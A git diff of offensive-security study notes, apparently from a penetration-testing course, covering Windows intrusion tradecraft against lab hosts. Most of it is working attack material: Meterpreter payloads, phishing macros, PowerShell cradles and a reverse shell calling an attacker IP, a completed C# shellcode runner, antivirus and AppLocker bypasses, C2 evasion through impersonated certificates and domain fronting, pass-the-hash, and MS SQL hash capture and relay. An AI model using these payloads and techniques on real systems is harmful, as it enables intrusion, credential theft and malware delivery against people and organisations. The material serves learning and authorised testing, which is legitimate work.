@@ -28,7 +28,7 @@ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=44
 
 ### smuggling.html
 
-HTML5 anchor tag download attribute instructs the browser to automatically download a file when a user clicks the assigned hyperlink.
+HTML5 anchor tag **download** attribute instructs the browser to automatically download a file when a user clicks the assigned hyperlink.
 
 ```html
 <html>
@@ -110,7 +110,8 @@ End Sub
 ## Phishing PreTexting
 
 1. With the text created, mark it and navigate to `Insert > Quick Parts > AutoTexts` and `Save Selection to AutoText Gallery`
-2. In the Create New Building Block dialog box, enter the name "TheDoc"
+
+2. In the **Create New Building Block** dialog box, enter the name "TheDoc"
 
 ```VB
 Sub Document_Open()
@@ -311,7 +312,7 @@ In some environments, network communications not going through the proxy will ge
 
 ## Fiddling With The User-Agent
 
-The Net.WebClient PowerShell download cradle does not have a default User-Agent set => The session will stand out from other legitimate traffic.
+The `Net.WebClient` PowerShell download cradle does not have a default User-Agent set => The session will stand out from other legitimate traffic.
 
 Customize User-Agent
 
@@ -332,20 +333,16 @@ PsExec.exe -s -i C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell_ise.exe
 
 A PowerShell download cradle running in **SYSTEM** integrity level context does not have a proxy configuration set and may fail to call back to our C2 infrastructure.
 
-=> create a proxy configuration for the built-in SYSTEM account, i.e., copy a configuration from a standard user account on the system.
+=> Create a proxy configuration for the built-in SYSTEM account, i.e., copy a configuration from a standard user account.
 
-Proxy settings for each user are stored in the registry at the following path:
+Proxy settings for each user are stored in the registry at 
 `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\InternetSettings`
 
-When navigating the registry, the HKEY_CURRENT_USER registry hive is mapped according to the user trying to access it, but when navigating the registry as SYSTEM, no such registry hive exists.
+When navigating the registry, the **HKEY_CURRENT_USER** registry hive is mapped according to the user trying to access it, but when navigating the registry as SYSTEM, no such registry hive exists.
 
-The **HKEY_USERS** registry hive always exists and contains the content of all user HKEY_CURRENT_USER registry hives split by their respective SIDs. Map the HKEY_USERS registry hive with the **New-PSDrive**
+The **HKEY_USERS** registry hive always exists and contains the content of all user HKEY_CURRENT_USER registry hives split by their respective SIDs. => Map the HKEY_USERS registry hive with the **New-PSDrive**
 
-The HKEY_USERS hive contains the hives of all users on the computer, including SYSTEM and other local service accounts, which we want to avoid.
-
-The registry hives are divided and named after the SIDs of existing users. Any SID starting with "**S-1-5-21-**" is a user account exclusive of built-in accounts.
-
-To obtain a valid user hive, loop through all top level entries of the HKEY_USERS until we find one with a matching SID. Once we find one, we can filter out the lower 10 characters leaving only the SID, while omitting the HKEY_USERS string.
+Any SID starting with "**S-1-5-21-**" is a user account exclusive of built-in accounts.
 
 ```pwsh
 New-PSDrive -Name HKU -PSProvider Registry -Root HKEY_USERS | Out-Null
@@ -483,8 +480,6 @@ namespace ShellcodeRunner
 
 ### Shellcode Parameter
 
-Provide URL of the Meterpreter staged shellcode generated with msfvenom in csharp format
-
 ```csharp
 using System;
 using System.Runtime.InteropServices;
@@ -506,17 +501,6 @@ namespace ShellcodeRunner
 
         static void Main(string[] args)
         {
-            // Check if a URL was provided
-            /*
-            if (args.Length == 0)
-            {
-                Console.WriteLine("Please provide the URL as a command-line argument.");
-                return;
-            }
-
-            string url = args[0]; // Get the URL from command-line arguments
-            */
-
             if (args.Length != 2)
             {
                 Console.WriteLine("Please provide the IP and filename as command-line arguments.");
@@ -551,7 +535,15 @@ namespace ShellcodeRunner
                             buf[i] = Convert.ToByte(hexArray[i].Trim(), 16);
                         }
 
-                        <input code here>
+                        int size = buf.Length;
+
+                        IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
+
+                        Marshal.Copy(buf, 0, addr, size);
+
+                        IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
+
+                        WaitForSingleObject(hThread, 0xFFFFFFFF);
                     }
                     else
                     {
@@ -1068,7 +1060,7 @@ namespace ProcessHollowing
 
 # Antivirus Evasion
 
-Read the bytes of the executable, zero out the byte at offset 18867, and write the modified executable to a new file
+Zero out the byte at offset 18867 of the executable, and write the modified executable to a new file
 
 ```pwsh
 $bytes  = [System.IO.File]::ReadAllBytes("C:\Tools\met.exe")
@@ -1082,7 +1074,7 @@ $bytes[18867] = 0
 msfvenom --list encoders
 ```
 
-The x86/shikata_ga_nai encoder is a commonly-used polymorphic encoder that produces different output each time it is run, making it effective for signature evasion. x64/zutto_dekiru encoder borrows many techniques from shikata_ga_nai.
+The `x86/shikata_ga_nai` encoder is a commonly-used polymorphic encoder that produces different output each time it is run => signature evasion. `x64/zutto_dekiru` encoder borrows many techniques from it.
 
 ```bash
 msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 -e x86/shikata_ga_nai -f exe -o met.exe
@@ -1960,7 +1952,7 @@ End Sub
 
 ### Dechaining with WMI
 
-PowerShell is running as a 64-bit process, => must update the PowerShell shellcode runner script accordingly
+PowerShell is running as a 64-bit process => update the PowerShell shellcode runner script accordingly
 
 ```VB
 Sub Document_Open()
@@ -1996,7 +1988,7 @@ Sub MyMacro()
 End Sub
 ```
 
-Reduce the number of times StrReverse appears in our code
+Reduce the number of times **StrReverse** appears in our code
 
 ```VB
 Sub Document_Open()
@@ -2019,7 +2011,7 @@ Sub MyMacro()
 End Sub
 ```
 
-Perform a more complex obfuscation by converting the ASCII string to its decimal representation and then performing a Caesar cipher encryption on the result
+Perform a more complex obfuscation (Caesar cipher encryption)
 
 ```pwsh
 $payload = "powershell -exec bypass -nop -w hidden -c iex((new-object system.net.webclient).downloadstring('http://192.168.119.120/run.txt'))"
@@ -2089,9 +2081,9 @@ Function MyMacro()
 End Function
 ```
 
-When most antivirus products emulate the execution of a document, they rename it. During execution, we check the name of the document and if we find that it is not the same as the one we originally provided, we can assume the execution has been emulated and we can exit the code
+When most antivirus products emulate the execution of a document, they **rename** it. During execution, check the name of the document and if it is not the same as the one we originally provided => the execution has been emulated => exit the code
 
-Generates a Meterpreter reverse shell as long as our file is named runner.doc
+Generates a Meterpreter reverse shell provided that our file is named `runner.doc`
 
 ```VB
 If ActiveDocument.Name <> Nuts("131134127127118131063117128116") Then
@@ -2111,13 +2103,17 @@ $client = New-Object System.Net.Sockets.TCPClient('192.168.119.120',443);$stream
 
 ### Invoke-Obfuscation
 
-```
+```pwsh
 Import-Module ./Invoke-Obfuscation/
 Invoke-Obfuscation
-Invoke-Obfuscation> set scriptpath run0.txt
-Invoke-Obfuscation> TOKEN
-Invoke-Obfuscation\Token> ALL
-Invoke-Obfuscation\Token\All> 1
+```
+
+Invoke-Obfuscation>
+```
+set scriptpath run0.txt
+TOKEN
+ALL
+1
 ```
 
 Store the output in `run.txt`
@@ -2431,19 +2427,26 @@ catch(e)
 # Application Whitelisting
 
 3 primary AppLocker rule categories, which can be combined as needed:
-1. based on file paths: used to whitelist a single file based on its filename and path or recursively include the contents of a directory.
-2. based on a file hash: allow a single file to execute regardless of the location. To avoid collisions, AppLocker uses a SHA256 Authenticode hash.
-3. based on a digital signature: whitelist all files from an individual publisher with a single signature, which simplifies whitelisting across version updates.
+
+1. Based on file paths: used to whitelist a single file based on its filename and path or recursively include the contents of a directory.
+
+2. Based on a file hash: allow a single file to execute regardless of the location. AppLocker uses a SHA256 Authenticode hash.
+
+3. Based on a digital signature: whitelist all files from an individual publisher with a single signature, which simplifies whitelisting across version updates.
 
 4 rule properties which enable enforcement for 4 separate file types.
-1. executables with the `.exe` file extension
-2. Windows Installer files which use the "`.msi`" file extension.
-3. PowerShell scripts, Jscript scripts, VB scripts and older file formats using the `.cmd` and `.bat` file extensions. This property does not include any third-party scripting engines like Python nor compiled languages like Java.
-4. Packaged Apps (also known as Universal Windows Platform (UWP) Apps) which include applications that can be installed from the Microsoft App store.
+
+1. Wxecutables: `.exe` file extension
+2. Windows Installer files: "`.msi`" file extension.
+3. PowerShell scripts, Jscript scripts, VB scripts and older file formats: `.cmd` and `.bat` file extensions. Does not include any 3rd-party scripting engines like Python nor compiled languages like Java.
+4. Packaged Apps (also known as Universal Windows Platform (UWP) Apps)  include applications that can be installed from the Microsoft App store.
 
 Default rules:
+
 * Block all applications except those explicitly allowed.
-* Allow all users to run executables in `C:\Program Files`, `C:\Program Files (x86)`, and `C:\Windows` recursively, including executables in all subfolders. This allows basic operating system functionality but prevents non-administrative users from writing in these folders due to default access rights.
+
+* Allow all users to run executables in `C:\Program Files`, `C:\Program Files (x86)`, and `C:\Windows` recursively, including executables in all subfolders. This allows basic OS functionality but prevents non-administrative users from writing in these folders due to default access rights.
+
 * Allows members of the administrative group to run any executables they desire.
 
 ## Basic Bypasses
@@ -2468,7 +2471,7 @@ The default ruleset doesn't protect against loading arbitrary DLLs
 rundll32 C:\Tools\TestDll.dll,run
 ```
 
-This code has already been compiled and saved as `C:\Tools\TestDll.dll` on the Windows 10 victim VM.
+`TestDll.dll`
 
 ```C
 #include "stdafx.h"
@@ -2505,7 +2508,7 @@ var shell = new ActiveXObject("WScript.Shell");
 var res = shell.Run("cmd.exe");
 ```
 
-TeamViewer version 12 uses a log file (`TeamViewer12_Logfile.log`) that is both writable and executable by the student user.
+TeamViewer version 12 uses a log file (`TeamViewer12_Logfile.log`) that is both writable and executable.
 
 ```bat
 type test.js > "C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:test.js"
@@ -2578,11 +2581,11 @@ Command-line utility **InstallUtil** allows us to install and uninstall server r
 
 => Abuse it to execute arbitrary C# code by putting the code inside either the install or uninstall methods of the installer class.
 
-Only use the uninstall method since the install method requires administrative privileges to execute.
+Only use the **uninstall** method since the install method requires administrative privileges to execute.
 
-The System.Configuration.Install namespace is missing an assembly reference in Visual Studio.
+The `System.Configuration.Install` namespace is missing an assembly reference in Visual Studio.
 
-=> Add this by right-clicking on **References** in the Solution Explorer and choosing **Add References**.... > navigate to the **Assemblies** menu on the left-hand side and scroll down to **System.Configuration.Install**.
+=> Add this by right-clicking on **References** in the Solution Explorer and choosing **Add References**.... > **Assemblies** menu on the left-hand side and scroll down to **System.Configuration.Install**.
 
 AppLocker DLL rules are enabled to block untrusted DLLs
 
@@ -2631,9 +2634,11 @@ namespace Bypass
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U C:\Tools\Bypass.exe
 ```
 
-At this point, it would be possible to reuse this tradecraft with the Microsoft Word macros since they are not limited by AppLocker. Instead of using WMI to directly start a PowerShell process and download the shellcode runner from our Apache web server, we could **make WMI execute InstallUtil** and obtain the same result despite AppLocker.
+It would be possible to reuse this tradecraft with the Microsoft Word macros since they are not limited by AppLocker.
 
-The issue is that **the compiled C# file has to be on disk when InstallUtil is invoked**. We must download an executable, and ensure that it is not flagged by antivirus.
+Instead of using WMI to directly start a PowerShell process and download the shellcode runner from our web server, we could **make WMI execute InstallUtil** and obtain the same result despite AppLocker.
+
+The issue is that **the compiled C# file has to be on disk when InstallUtil is invoked**.
 
 To attempt to bypass anitvirus, obfuscate the executable while it is being downloaded with Base64 encoding and then decode it on disk.
 
@@ -2691,7 +2696,7 @@ $Acl = Get-ACL $output;$AccessRule= New-Object System.Security.AccessControl.Fil
 C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe run.xml results.xml
 ```
 
-Downside: We must provide both the XML file and the C# code file on disk, and the C# code file will be compiled temporarily to disk as well.
+Downside: Must provide both the XML file and the C# code file on disk, and the C# code file will be compiled temporarily to disk as well.
 
 ### MSbuild
 
@@ -2750,7 +2755,7 @@ Executes the code in a project file using `msbuild.exe`.
 </Project>
 ```
 
-The default C# project example file above will simply print "Hello From a Code Fragment" and "Hello From a Class." to the screen.
+The C# project file above will simply print "Hello From a Code Fragment" and "Hello From a Class." to the screen.
 
 ```bat
 C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe T1127.001.csproj
@@ -2758,7 +2763,7 @@ C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe T1127.001.csproj
 
 ## Bypassing AppLocker with JScript
 
-HTML Applications include embedded Jscript or VBS code that is parsed and executed by mshta.exe.
+HTML Applications include embedded Jscript or VBS code that is parsed and executed by `mshta.exe`.
 
 Since mshta.exe is located in `C:\Windows\System32` and is a signed Microsoft application, it is commonly whitelisted.
 
@@ -2855,23 +2860,21 @@ Have several domains prepared in advance so we can swap them out as needed.
 
 [Symantec Corporation](https://sitereview.bluecoat.com/)
 
-When our payload tries to connect back to the C2 server, it must detect local proxy settings, and implement those settings instead of trying to connect to the given domain directly.
+When our payload tries to connect back to the C2 server, it must detect and implement local proxy settings, instead of trying to connect to the given domain directly.
 
 => Meterpreter's HTTP/S payload is proxy-aware (thanks to the InternetSetOptionA API).
 
 Ensure that the domain and URL are clean and that our C2 server is safely **categorized** as defined by our client's policy rules.
 
-If the client has deployed a URL verification or categorization system, we should factor their policy settings into our bypass strategy.
-
-If our C2 server domain is uncategorized, we should follow the prompts to categorize it according to the company's allowed use policy, since an unnamed domain will likely be flagged.
+If our C2 server domain is uncategorized, follow the prompts to categorize it according to the company's allowed use policy, since an unnamed domain will likely be flagged.
 
 Grab a seemingly-safe domain by hosting our C2 in a **cloud service or Content Delivery Network (CDN)**, which auto-assigns a generic domain. E.g., `cloudfront.net`, `wordpress.com`, or `azurewebsites.net`. These types of domains are often auto-allowed since they are used by legitimate websites and hosting services.
 
-Consider the traces our C2 session will leave in the proxy logs. E.g., Instead of simply generating custom TCP traffic on ports 80 or 443, our session should **conform to HTTP protocol standards**.
+Consider the traces our C2 session will leave in the proxy logs. Instead of simply generating custom TCP traffic on ports 80 or 443, our session should **conform to HTTP protocol standards**.
 
 => Many framework payloads, including Metasploit's Meterpreter, follow the standards as they use HTTP APIs like HttpOpenRequestA.
 
-Set our **User-Agent** to a browser type that is permitted by the organization. E.g., if the organization uses Microsoft Windows with Edge, we should set it accordingly. A User-Agent for Chrome running on macOS will likely raise suspicion or might be blocked.
+Set our **User-Agent** to a browser type that is permitted by the organization. E.g., Microsoft Windows with Edge. A User-Agent for Chrome running on macOS will likely raise suspicion or might be blocked.
 
 To determine an allowed User-Agent string, consider social engineering or sniff HTTP packets from our internal point of presence.
 
@@ -2883,16 +2886,17 @@ Set our custom User-Agent in Meterpreter with the **HttpUserAgent** advanced con
 
 ### Bypassing Norton HIPS with Custom Certificates
 
-Norton HIPS detects the standard Meterpreter HTTPS certificate. Certificates are used to ensure (or certify) the identity of a domain and encrypt network traffic through a variety of cryptographic mechanisms.
+Norton HIPS detects the standard Meterpreter HTTPS certificate.
 
-Normally, certificates are issued by trusted authorities called Certificate Authorities (CA), which are well-known. E.g., the CA trusted root certificates are pre-installed on most OS, which streamlines validation.
+Potential reasons:
 
-Norton may be flagging this because it's a self-signed certificate => use a real SSL certificate, which requires that we own that domain => Obtain a signed, valid certificate, perhaps from a service provider like **Let's Encrypt**.
+- It's a self-signed certificate => use a real SSL certificate, which requires that we own that domain => Obtain a signed, valid certificate, perhaps from a service provider like **Let's Encrypt**.
 
-Self-signed certificates are somewhat common for non-malicious use though => Norton contains signatures for the data present in Meterpreter's randomized certificates. 
+- Self-signed certificates are somewhat common for non-malicious use though => Norton contains signatures for the data present in Meterpreter's randomized certificates. 
 
-To create our own self-signed certificate, customize some of its fields (If the certificate is passing through HTTPS inspection, the traffic might flag because of an untrusted certificate.)
-* Generate a self-signed certificate that matches a given domain with Metasploit's **impersonate_ssl** auxiliary module. This module will create a self-signed certificate whose metadata matches the site we are trying to impersonate.
+Create our own self-signed certificate, customize some of its fields (If the certificate is passing through HTTPS inspection, the traffic might flag because of an untrusted certificate.)
+
+* Generate a self-signed certificate whose metadata matches the site we are trying to impersonate with Metasploit's **impersonate_ssl** auxiliary module.
 
 * Manually create a self-signed certificate with `openssl`, which allows us full control over the certificate details.
 
@@ -2908,9 +2912,9 @@ cat priv.key cert.crt > nasa.pem
 * -out cert.crt: Output file for the certificate.
 * -keyout priv.key: Output file for the private key.
 
-Change the CipherString in the `/etc/ssl/openssl.cnf` config file or our reverse HTTPS shell will not work properly.
+Change the CipherString in the `/etc/ssl/openssl.cnf` config file or our reverse HTTPS shell will not work properly:
 
-Remove the "@SECLEVEL=2" string, as the SECLEVEL option limits the usable hash and cypher functions in an SSL or TLS connection, i.e. set this to "DEFAULT", which allows all.
+- Remove the "@SECLEVEL=2" string, as the SECLEVEL option limits the usable hash and cypher functions in an SSL or TLS connection, i.e. set this to "DEFAULT", which allows all.
 
 `CipherString=DEFAULT@SECLEVEL=2` > `CipherString=DEFAULT`
 
@@ -2944,17 +2948,19 @@ If we are using HTTPS, simply assume that our traffic will be inspected and try 
 
 Using **TLS Certificate Pinning** in Meterpreter, specify the certificate that will be trusted. Meterpreter will then compare the hash of the certificates and if there is a mismatch, it will terminate itself. This can be controlled by setting the **StagerVerifySSLCert** option to "true" and configuring **HandlerSSLCert** with the certificate we trust and want to use.
 
-Also try to **categorize** the target domain of our traffic to reduce the likelihood of inspection. Some categories, like "banking", are usually not subject to inspection because of privacy concerns.
+Try to **categorize** the target domain of our traffic to reduce the likelihood of inspection. Some categories, like "banking", are usually not subject to inspection because of privacy concerns.
 
 ## Domain Fronting
 
-Large Content Delivery Networks (CDN) can be difficult to block or filter on a granular basis. Depending on the feature set supported by a CDN provider, domain fronting allows us to fetch arbitrary website content from a CDN, even though the initial TLS session is targeting a different domain. This is possible as the TLS and the HTTP session are handled independently.
+Large Content Delivery Networks (CDN) can be difficult to block or filter on a granular basis.
 
-E.g., we can initiate the TLS session to `www.example1.com` and then get the contents of `www.example2.com`.
+Domain fronting allows us to fetch arbitrary website content from a CDN, even though the initial TLS session is targeting a different domain. This is possible as the TLS and the HTTP session are handled independently.
+
+E.g., Initiate the TLS session to `www.example1.com` and then get the contents of `www.example2.com`.
 
 With **virtual hosting**, multiple web sites associated with different domains could be hosted on a single machine, i.e. from a single IP address. The key to this functionality is the **request HOST header**, which specifies the **target domain name**, and optionally the port on which the web server is listening for the specified domain.
  
-On the hosting server itself, the Host header maps to a value in one of the web server's configuration files.
+On the hosting server itself, the **Host** header maps to a value in one of the web server's configuration files.
 
 E.g., NGINX configuration shown below
 
@@ -3880,7 +3886,7 @@ Determine the local computername from the associated environment variable and us
 $env:computername
 ```
 
-Specify the computername through the Domain property and the account name through the Name property.
+Locate the SID of the local administrator account 
 
 ```pwsh
 [wmi] "Win32_userAccount.Domain='client',Name='Administrator'"
@@ -4561,17 +4567,15 @@ privilege::debug
 sekurlsa::pth /user:admin /domain:corp1 /ntlm:2892D26CDF84D7A70E2EB3B9F05C425E /run:"mstsc.exe /restrictedadmin"
 ```
 
-Restricted admin mode is not enabled by default. However, if we are in possession of a password hash for a local account on the target machine, we can enable it in order to be able to use a RDP connection to that target.
-
 Disable the restricted admin mode on our appsrv01 target.
 
 ```pwsh
 Remove-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name DisableRestrictedAdmin
 ```
 
-When we click Connect, we are presented with the error message which indicates that restricted admin mode is disabled.
+When we click Connect, => error message which indicates that restricted admin mode is disabled.
 
-To re-enable restricted admin mode, launch a local instance of PowerShell on the Windows 10 machine in the context of the admin user with Mimikatz.
+To re-enable restricted admin mode, launch a local instance of PowerShell in the context of the admin user with Mimikatz.
 
 ```
 sekurlsa::pth /user:admin /domain:corp1 /ntlm:2892D26CDF84D7A70E2EB3B9F05C425E /run:powershell
@@ -4892,7 +4896,386 @@ Since Notepad is not a service executable, the service control manager will term
 
 # Microsoft SQL Attacks
 
+MS SQL commonly operates on TCP port 1433.
 
+When a MS SQL server is running in the context of an Active Directory service account, it is normally associated with a Service Principal Name (SPN).
+
+The SPN links the service account to the SQL server and its associated Windows server.
+
+On a domain-joined workstation in the context of a domain user, query the hostname and TCP port for Kerberos-integrated MS SQL servers across the entire domain
+
+```bat
+setspn -T corp1 -Q MSSQLSvc/*
+```
+
+Obtain information about the service account context under which the SQL servers are running. e.g., SQLSvc domain account, a member of built-in Administrators group.
+
+=> The service account is a local administrator on both of the Windows servers where it's used.
+
+```pwsh
+. .\GetUserSPNs.ps1
+```
+
+## MS SQL Authentication
+
+Authentication in MS SQL is implemented in 2 stages.
+
+1. A traditional login is required, either an SQL server login or Windows account-based authentication.
+
+- SQL server login is performed with local accounts on each individual SQL server.
+
+- Windows authentication on the other hand, works through Kerberos and allows any domain user to authenticate with a Ticket Granting Service (TGS) ticket.
+
+2. After a successful login, the login is mapped to a database user account.
+
+E.g., a login with the built-in SQL server **sa** account will map to the **dbo** user account. A login with an account that has no associated SQL user account will automatically be mapped to the built-in **guest** user account.
+
+A login such as sa, which is mapped to the dbo user, will have the **sysadmin** role, i.e. an administrator of the SQL server.
+
+A login that is mapped to the guest user will get the **public** role.
+
+If Windows authentication is enabled, e.g. when the SQL server is integrated with AD, we can authenticate through Kerberos => Do not need to specify a password.
+
+The default database in MS SQL is called "**master**".
+
+Specify either the login and password or choose Windows Authentication with the "Integrated Security = True" setting.
+
+The `Builtin\Users` group has access by default, and the **Domain Users** group is a member of `Builtin\Users`. Since any domain account is a member of the **Domain Users** group, we automatically have access.
+
+Check which SQL server roles are available to us.
+
+The **SYSTEM_USER** SQL variable contains the name of the SQL login for the current session.
+
+"SELECT SYSTEM_USER;"
+
+Determine the username it is mapped to with the **USER_NAME()** function.
+
+The **IS_SRVROLEMEMBER** function can be used to determine if a specific login is a member of a server role.
+
+`Sql.exe`
+
+```csharp
+using System;
+using System.Data.SqlClient;
+
+namespace SQL
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            String sqlServer = "dc01.corp1.com";
+            String database = "master";
+
+            String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";
+            SqlConnection con = new SqlConnection(conString);
+
+            try
+            {
+              con.Open();
+              Console.WriteLine("Auth success!");
+            }
+            catch
+            {
+              Console.WriteLine("Auth failed");
+              Environment.Exit(0);
+            }
+
+            String querylogin = "SELECT SYSTEM_USER;";
+            SqlCommand command = new SqlCommand(querylogin, con);
+            SqlDataReader reader = command.ExecuteReader();
+            reader.Read();
+            Console.WriteLine("Logged in as: " + reader[0]);
+            reader.Close();
+
+            String querypublicrole = "SELECT IS_SRVROLEMEMBER('public');";
+            command = new SqlCommand(querypublicrole, con);
+            reader = command.ExecuteReader();
+            reader.Read();
+            Int32 role = Int32.Parse(reader[0].ToString());
+            if(role == 1)
+            {
+              Console.WriteLine("User is a member of public role");
+            }
+            else
+            {
+              Console.WriteLine("User is NOT a member of public role");
+            }
+            reader.Close();
+
+            String querysysadminrole = "SELECT IS_SRVROLEMEMBER('sysadmin');";
+            command = new SqlCommand(querysysadminrole, con);
+            reader = command.ExecuteReader();
+            reader.Read();
+            role = Int32.Parse(reader[0].ToString());
+            if(role == 1)
+            {
+              Console.WriteLine("User is a member of sysadmin role");
+            }
+            else
+            {
+              Console.WriteLine("User is NOT a member of sysadmin role");
+            }
+            reader.Close();
+
+            con.Close();
+        }
+    }
+}
+```
+
+```bat
+Sql.exe
+```
+
+## UNC Path Injection
+
+If we can force an SQL server to connect to an SMB share we control, the connection will include NTLM authentication data.
+
+=> Capture the hash of the user account under whose context the SQL server is running.
+
+=> Crack the hash or use it in relaying attacks.
+
+Force the SQL server to perform a connection request to a SMB share on our Kali machine.
+
+**xp_dirtree** SQL procedure, which lists all files in a given folder. The procedure can accept a SMB share as a target, rather than just local file paths.
+
+A SMB share is typically supplied with a Universal Naming Convention (UNC)path:
+
+`\\hostname\folder\file`
+
+If the hostname is given as an IP address, Windows will automatically revert to NTLM authentication instead of Kerberos authentication.
+
+```csharp
+using System;
+using System.Data.SqlClient;
+
+namespace SQL
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            String sqlServer = "dc01.corp1.com";
+            String database = "master";
+
+            String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";
+            SqlConnection con = new SqlConnection(conString);
+           
+            try
+            {
+                con.Open();
+                Console.WriteLine("Auth success!");
+            }
+            catch
+            {
+                Console.WriteLine("Auth failed");
+                Environment.Exit(0);
+            }
+
+            String query = "EXEC master..xp_dirtree \"\\\\192.168.119.120\\\\test\";";
+            SqlCommand command = new SqlCommand(query, con);
+            SqlDataReader reader = command.ExecuteReader();
+            reader.Close();
+            
+            con.Close();
+        }
+    }
+}
+```
+
+Many other SQL procedures can be used to initiate the connection if xp_dirtree has been removed for security reasons.
+
+Set up a SMB share that will initiate NTLM authentication when the SQL service account performs the connection.
+
+```bash
+sudo responder -I tun0
+```
+
+The hash obtained by Responder is called a Net-NTLM hash or sometimes NTLMv2.
+
+NTLM vs Net-NTLM:
+
+- Windows user account passwords are stored locally as NTLM hashes.
+
+- When authentication with the NTLM protocol takes place over the network, a challenge and response is created based on the NTLM hash. The resulting hash is called Net-NTLM and it represents the same clear text password as the NTLM hash.
+
+`hash.txt`
+
+```
+sqlsvc::CORP1:872f7e4075b430f7:0EC63E37E50179D29447E99DB4F11811:010100000000000000A175FC3C1EDB01A342D17101A3315E000000000...
+```
+
+Crack the hash
+
+```bash
+hashcat -m 5600 hash.txt dict.txt --force
+```
+
+## Relay My Hash
+
+Net-NTLM hash cannot be used in a pass-the-hash attack, but we can relay it to a different computer (takes advantage of **shared accounts**)
+
+If the user is a local administrator on the target, we can obtain code execution.
+
+It's not possible to relay a Net-NTLM hash back to the origin computer using the same protocol as this was blocked by Microsoft in 2008.
+
+Net-NTLM relaying against SMB is only possible if **SMB signing is not enabled**. SMB signing is only enabled by default on domain controllers.
+
+=> relay the Net-NTLM hash from dc01 to appsrv01.
+
+Base64 encode PowerShell download cradle.
+
+```pwsh
+$text = "(New-Object System.Net.WebClient).DownloadString('http://192.168.119.120/run.txt') | IEX"
+$bytes = [System.Text.Encoding]::Unicode.GetBytes($text)
+$EncodedText = [Convert]::ToBase64String($bytes)
+$EncodedText
+```
+
+Start a Metasploit multi/handler to catch the reverse Meterpreter shell on our Kali machine.
+
+Launch impacket-ntlmrelayx and prevent it from setting up an HTTP web server with the --no-http-server flag. ntlmrelayx uses SMB version 1 by default, which is disabled on Windows Server 2019, so we must specify the -smb2support flag to force authentication as SMB version 2.
+
+Next, we supply the IP address of appsrv01 with the -t option and the command to execute with -c.
+
+```bash
+impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.120.6 -c 'powershell -enc <base64 encoded cradle>'
+```
+
+## MS SQL Escalation
+
+Use a different approach that relies on Impersonation. This can be accomplished using the **EXECUTE AS** statement, which provides a way to execute a SQL query in the context of a different login or user.
+
+Only users with the explicit **Impersonate permission** are able to use impersonation.
+
+2 different ways impersonation can be used. Impersonate a different user at the
+
+1. Login level with the **EXECUTE AS LOGIN** statement.
+
+2. User level with the **EXECUTE AS USER** statement.
+
+### Impersonation at the login level.
+
+Enumerate which logins allow impersonation, but not who is given the permission to impersonate them.
+
+`SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'`
+
+```csharp
+using System;
+using System.Data.SqlClient;
+
+namespace SQL
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            String sqlServer = "dc01.corp1.com";
+            String database = "master";
+
+            String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";
+            SqlConnection con = new SqlConnection(conString);
+
+            try
+            {
+                con.Open();
+                Console.WriteLine("Auth success!");
+            }
+            catch
+            {
+                Console.WriteLine("Auth failed");
+                Environment.Exit(0);
+            }
+
+            String query = "SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';";
+            SqlCommand command = new SqlCommand(query, con);
+            SqlDataReader reader = command.ExecuteReader();
+
+            while(reader.Read() == true)
+            {
+              Console.WriteLine("Logins that can be impersonated: " + reader[0]);
+            }
+            reader.Close();
+
+            con.Close();
+        }
+    }
+}
+```
+
+E.g., Discover that the sa login does allow impersonation.
+
+Let's try to impersonate the sa login.
+
+```csharp
+using System;
+using System.Data.SqlClient;
+using System.Collections.Generic;
+using System.Linq;
+
+namespace SQL
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            String sqlServer = "dc01.corp1.com";
+            String database = "master";
+
+            String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";
+            SqlConnection con = new SqlConnection(conString);
+
+            try
+            {
+                con.Open();
+                Console.WriteLine("Auth success!");
+            }
+            catch
+            {
+                Console.WriteLine("Auth failed");
+                Environment.Exit(0);
+            }
+
+            Console.WriteLine("Before impersonation");
+            String querylogin = "SELECT SYSTEM_USER;";
+            SqlCommand command = new SqlCommand(querylogin, con);
+            SqlDataReader reader = command.ExecuteReader();
+            reader.Read();
+            Console.WriteLine("Executing in the context of: " + reader[0]);
+            reader.Close();
+
+            String query = "SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';";
+            command = new SqlCommand(query, con);
+            reader = command.ExecuteReader();
+
+            List<String> impersonatablelogins = new List<String>();
+            
+            while (reader.Read() == true)
+            {
+                impersonatablelogins.Add(reader[0].ToString());
+            }
+            reader.Close();
+            
+            if (!impersonatablelogins.Any())
+                Console.WriteLine("There is no login that can be impersonated");
+            else
+            {
+                Console.WriteLine("After impersonation");
+                foreach (String impersonatablelogin in impersonatablelogins)
+                {
+                    String executeas = "EXECUTE AS LOGIN = '" + impersonatablelogin + "';";
+                    command = new SqlCommand(executeas, con);
+                    reader = command.ExecuteReader();
+                    Console.WriteLine("Executing in the context of: " + impersonatablelogin);
+                    reader.Close();
+                }
+            }
+            con.Close();
+        }
+    }
+}
+```
 
